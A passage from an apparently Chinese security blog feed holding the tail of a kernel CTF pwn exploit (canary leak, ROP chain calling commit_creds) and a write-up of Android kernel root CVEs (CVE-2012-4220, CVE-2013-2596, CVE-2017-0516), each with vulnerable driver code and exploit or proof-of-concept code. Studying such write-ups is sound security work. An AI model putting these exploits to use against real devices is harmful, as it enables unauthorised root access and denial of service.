class="number">-1</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x30002</span>, leak_value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i = 0 ; i * 8 &lt; 0x1000 ; i++ )&#123;</span></span><br><span class="line">    <span class="comment">//     uint64_t tmp = u64(&amp;leak_value[i * 8]);</span></span><br><span class="line">    <span class="comment">//     printf("naddress %d: %pn",i * 8 ,tmp);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> Canary = u64(&amp;leak_value[<span class="number">40</span> * <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nCanary: %pn"</span>,Canary);</span><br><span class="line">    <span class="keyword">uint64_t</span> Rand_addr = u64(&amp;leak_value[<span class="number">42</span> * <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nRand address: %pn"</span>,Rand_addr);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred = (<span class="keyword">void</span> *)(Rand_addr + <span class="number">0xffffffff810a1820</span> - <span class="number">0xffffffff81219218</span>);</span><br><span class="line">    commit_creds = (<span class="keyword">void</span> *)(Rand_addr + <span class="number">0xffffffff810a1430</span> - <span class="number">0xffffffff81219218</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">40</span> ; i++ )</span><br><span class="line">        Send_value[i] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">40</span>] = Canary;</span><br><span class="line">    Send_value[<span class="number">41</span>] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">42</span>] = Rand_addr + <span class="number">0xffffffff8109054d</span> - <span class="number">0xffffffff81219218</span>;</span><br><span class="line">    Send_value[<span class="number">43</span>] = <span class="number">0x6e0</span>;</span><br><span class="line">    Send_value[<span class="number">44</span>] = Rand_addr + <span class="number">0xffffffff81004d70</span> - <span class="number">0xffffffff81219218</span>;</span><br><span class="line">    Send_value[<span class="number">45</span>] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">46</span>] = payload;</span><br><span class="line">    Send_value[<span class="number">47</span>] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x30001</span>, Send_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;致谢参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/201454&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/2014
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android 相关 CVE</title>
    <link href="https://github.com/Cracke-S-J/2020/04/01/Android%E7%9B%B8%E5%85%B3CVE/"/>
    <id>https://github.com/Cracke-S-J/2020/04/01/Android%E7%9B%B8%E5%85%B3CVE/</id>
    <published>2020-04-01T08:37:11.000Z</published>
    <updated>2020-04-02T08:41:25.598Z</updated>
    
    <content type="html"><![CDATA[<p>原来 Android 就是这么被 root 的。结尾有彩蛋，Janus 分析。</p><p>先贴一个<a href="https://elixir.bootlin.com/linux/" target="_blank" rel="noopener">Linux源码阅读的网站</a>。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="ioctl-函数"><a href="#ioctl-函数" class="headerlink" title="ioctl()函数"></a>ioctl()函数</h3><p><a href="https://blog.csdn.net/gemmem/article/details/7268533" target="_blank" rel="noopener">ioctl()函数详解</a></p><h2 id="CVE-2012-4220-libdiagexploit"><a href="#CVE-2012-4220-libdiagexploit" class="headerlink" title="CVE-2012-4220(libdiagexploit)"></a>CVE-2012-4220(libdiagexploit)</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><blockquote><p>diagchar_core.c in the Qualcomm Innovation Center (QuIC) Diagnostics (aka DIAG) kernel-mode driver for Android 2.3 through 4.2 allows attackers to execute arbitrary code or cause a denial of service (incorrect pointer dereference) via an application that uses crafted arguments in a local diagchar_ioctl call.</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>对于用户态传递的参数 ioarg 没有检验直接使用。传递一个无效指针即可造成拒绝服务。</li><li>对 delay_params 中的 rsp_ptr 以及 num_bytes_ptr 两个用户态的指针仅做了非空判断就直接使用。传递无效指针可造成拒绝服务，传递其他地址可以造成任意地址写入攻击。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: drivers/char/diag/diagchar_core.c</span></span><br><span class="line"><span class="comment">// function: diagchar_ioctl</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (iocmd == DIAG_IOCTL_GET_DELAYED_RSP_ID) &#123;</span><br><span class="line">  struct diagpkt_delay_params *delay_params =</span><br><span class="line">        (struct diagpkt_delay_params *) ioarg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((delay_params-&gt;rsp_ptr) &amp;&amp;</span><br><span class="line">   (delay_params-&gt;size == <span class="keyword">sizeof</span>(delayed_rsp_id)) &amp;&amp;</span><br><span class="line">       (delay_params-&gt;num_bytes_ptr)) &#123;</span><br><span class="line">    *((<span class="keyword">uint16_t</span> *)delay_params-&gt;rsp_ptr) =</span><br><span class="line">      DIAGPKT_NEXT_DELAYED_RSP_ID(delayed_rsp_id);</span><br><span class="line">    *(delay_params-&gt;num_bytes_ptr) = <span class="keyword">sizeof</span>(delayed_rsp_id);</span><br><span class="line">    success = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先看一下相关的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> delayed_rsp_id = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIAGPKT_MAX_DELAYED_RSP 0xFFFF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIAGPKT_NEXT_DELAYED_RSP_ID(x) \</span></span><br><span class="line">        ((x &lt; DIAGPKT_MAX_DELAYED_RSP) ? x++ : DIAGPKT_MAX_DELAYED_RSP)</span><br></pre></td></tr></table></figure><p>需要注意以下几点：</p><ol><li>delay_params-&gt;rsp_ptr 被当作 16 位的指针处理，写入的内容是 delayed_rsp_id 的值，这个值的范围是 0x2 ~ 0xFFFF。</li><li>如果希望向特定的地址写入特定的值，需要获取到当前的 delayed_rsp_id 的值，然后用目标值减去当前值，得到了循环的次数，最后循环发送 ioctl 即可将特定地址的值修改为我们想要的值。</li><li>如果 delayed_rsp_id 的值要比目标的值大，则可以使用 num_bytes_ptr 来重置 delayed_rsp_id 的值为 2。</li></ol><p>写得比较完整的利用代码可以参考 <a href="https://github.com/android-rooting-tools/libdiagexploit">这里</a>，不过这个 exp 有个问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">inject_value(struct diag_values *data,</span><br><span class="line">             <span class="keyword">int</span> fd, <span class="keyword">void</span> *delayed_rsp_id_address)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">uint16_t</span> delayed_rsp_id_value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> i, loop_count, ret;</span><br><span class="line"></span><br><span class="line">  ret = get_current_delayed_rsp_id(fd);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  delayed_rsp_id_value = ret;</span><br><span class="line">  data-&gt;original_value = delayed_rsp_id_value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (delayed_rsp_id_value &gt; data-&gt;value &amp;&amp;</span><br><span class="line">    reset_delayed_rsp_id(fd, delayed_rsp_id_address) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  loop_count = (data-&gt;value - delayed_rsp_id_value) &amp; <span class="number">0xffff</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loop_count; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="keyword">if</span> (send_delay_params(fd, (<span class="keyword">void</span> *)data-&gt;address, &amp;unused) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中，在 delayed_rsp_id_value 比 data-&gt;value 大的时候，会调用 reset_delayed_rsp_id 重置 delayed_rsp_id 计数为 2，但这个时候，并没有修改局部变量的 delayed_rsp_id_value 为 2，导致后面计算的 loop_count 不正确，因此无法正确的写入值。而且写入值的时候，需要注意控制 0 和 1 的出现。比如写入地址的时候，分配一块地址较高内存进行处理会让利用更稳定一些。</p><h2 id="CVE-2013-2596-libfb-mem-exploit"><a href="#CVE-2013-2596-libfb-mem-exploit" class="headerlink" title="CVE-2013-2596(libfb_mem_exploit)"></a>CVE-2013-2596(libfb_mem_exploit)</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><blockquote><p>Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.</p></blockquote><p>fb_mmap 函数导致的整数溢出，可以使得用户模式的程序把整个内核以可读写的方式映射到用户模式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;        <span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;        <span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">                       within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">     * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">     * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">     * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>    <span class="comment">/* The address space we belong to. */</span></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;        <span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;        <span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">     * linkage into the address_space-&gt;i_mmap interval tree, or</span></span><br><span class="line"><span class="comment">     * linkage of vma in the address_space-&gt;i_mmap_nonlinear list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">        &#125; linear;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">nonlinear</span>;</span></span><br><span class="line">    &#125; shared;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A file's MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">     * list, after a COW of one of the file pages.    A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">     * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">     * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">                      * page_table_lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>    <span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information about our backing store: */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;        <span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">                       units, *not* PAGE_CACHE_SIZE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>        <span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">    <span class="keyword">void</span> * vm_private_data;        <span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>    <span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>    <span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">fb_mmap(struct file *file, struct vm_area_struct * vma)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fb_info</span> *<span class="title">info</span> = <span class="title">file_fb_info</span>(<span class="title">file</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fb_ops</span> *<span class="title">fb</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> off;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line">    u32 len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">return</span> -ENODEV;</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_pgoff &gt; (~<span class="number">0U</span>L &gt;&gt; PAGE_SHIFT))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    off = vma-&gt;vm_pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    fb = info-&gt;fbops;</span><br><span class="line">    <span class="keyword">if</span> (!fb)</span><br><span class="line">        <span class="keyword">return</span> -ENODEV;</span><br><span class="line">    mutex_lock(&amp;info-&gt;mm_lock);</span><br><span class="line">    <span class="keyword">if</span> (fb-&gt;fb_mmap) &#123;</span><br><span class="line">        <span class="keyword">int</span> res;</span><br><span class="line">        res = fb-&gt;fb_mmap(info, vma);</span><br><span class="line">        mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* frame buffer memory */</span></span><br><span class="line">    start = info-&gt;fix.smem_start;</span><br><span class="line">    len = PAGE_ALIGN((start &amp; ~PAGE_MASK) + info-&gt;fix.smem_len);</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= len) &#123;</span><br><span class="line">        <span class="comment">/* memory mapped io */</span></span><br><span class="line">        off -= len;</span><br><span class="line">        <span class="keyword">if</span> (info-&gt;var.accel_flags) &#123;</span><br><span class="line">            mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        start = info-&gt;fix.mmio_start;</span><br><span class="line">        len = PAGE_ALIGN((start &amp; ~PAGE_MASK) + info-&gt;fix.mmio_len);</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">    start &amp;= PAGE_MASK;</span><br><span class="line">    <span class="comment">// 这里可以控制绕过。</span></span><br><span class="line">    <span class="keyword">if</span> ((vma-&gt;vm_end - vma-&gt;vm_start + off) &gt; len)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    off += start;</span><br><span class="line">    vma-&gt;vm_pgoff = off &gt;&gt; PAGE_SHIFT;</span><br><span class="line">    <span class="comment">/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/</span></span><br><span class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vma-&gt;vm_flags);</span><br><span class="line">    fb_pgprotect(file, vma, off);</span><br><span class="line">    <span class="keyword">if</span> (io_remap_pfn_range(vma, vma-&gt;vm_start, off &gt;&gt; PAGE_SHIFT,</span><br><span class="line">        vma-&gt;vm_end - vma-&gt;vm_start, vma-&gt;vm_page_prot))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>vma-&gt;vm_end 和 vma-&gt;vm_start 是 mmap 的前两个参数，描述了要映射到的地址范围，vm_end - vm_start 得到的是要映射的 size，代码中用 size + off 判断要映射的大小是否在 len 之内。这三个值都是可以控制的，通过控制这三个值产生整数溢出，绕过判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mapped_address = mmap((<span class="keyword">void</span> *)MAPPED_BASE, (<span class="number">0x100000000</span> - kernel_phys_address),</span><br><span class="line">                        PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,</span><br><span class="line">                        *fd, kernel_phys_address + info.smem_len);</span><br></pre></td></tr></table></figure><p>MAPPED_BASE 是固定的值，为 0x20000000，即要映射的地址。size 上用一个大于 32 位的数减去了内核基地址。<br>off 是用内核地址加上了 smem_len。</p><h2 id="CVE-2017-0516"><a href="#CVE-2017-0516" class="headerlink" title="CVE-2017-0516"></a>CVE-2017-0516</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><blockquote><p>hbtp_input 的驱动在处理 HBTP_SET_ABSPARAM 时没有对下标进行有效的范围判断，导致下标溢出，进而导致堆溢出，此时用户态程序获得堆数据写入的机会。</p></blockquote><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ABS_MAX                 0x3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ABS_CNT                 (ABS_MAX+1)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_set_abs_params</span><span class="params">(struct input_dev *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> axis,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> min, <span class="keyword">int</span> max, <span class="keyword">int</span> fuzz, <span class="keyword">int</span> flat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">input_absinfo</span> *<span class="title">absinfo</span>;</span></span><br><span class="line"></span><br><span class="line">    input_alloc_absinfo(dev);</span><br><span class="line">    <span class="keyword">if</span> (!dev-&gt;absinfo)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    absinfo = &amp;dev-&gt;absinfo[axis];  <span class="comment">// Notice</span></span><br><span class="line">    absinfo-&gt;minimum = min;</span><br><span class="line">    absinfo-&gt;maximum = max;</span><br><span class="line">    absinfo-&gt;fuzz = fuzz;</span><br><span class="line">    absinfo-&gt;flat = flat;</span><br><span class="line"></span><br><span class="line">    __set_bit(EV_ABS, dev-&gt;evbit);</span><br><span class="line">    __set_bit(axis, dev-&gt;absbit);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(input_set_abs_params);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= ABS_MT_LAST - ABS_MT_FIRST; i++) &#123;</span><br><span class="line">    <span class="built_in">abs</span> = absinfo + i;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>-&gt;active)</span><br><span class="line">        input_set_abs_params(input_dev, <span class="built_in">abs</span>-&gt;code,</span><br><span class="line">                <span class="built_in">abs</span>-&gt;minimum, <span class="built_in">abs</span>-&gt;maximum, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>absinfo 为 struct hbtp_input_absinfo* 数组，每次取出一个 abs 后，调用 input_set_abs_params 给 input_dev 赋值。axis 被当作了下标来处理，axis 来自 abs-&gt;code，用户态可控。所以，用户态程序可以使之访问到其他内存，并能够通过 abs-&gt;minimum 和 abs-&gt;maximum 写入 max 和 min。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hbtp_input_absinfo</span> <span class="title">absinfo</span>[<span class="title">ABS_MT_LAST</span> - <span class="title">ABS_MT_FIRST</span> + 1] = &#123;</span> <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = getfd(dev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ABS_MT_LAST - ABS_MT_FIRST + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        absinfo[i].active = <span class="number">1</span>;</span><br><span class="line">        absinfo[i].code = <span class="number">0xFFFF</span> - i;</span><br><span class="line">        absinfo[i].minimum = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">        absinfo[i].maximum = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        ioctl(fd, HBTP_SET_ABSPARAM, absinfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a 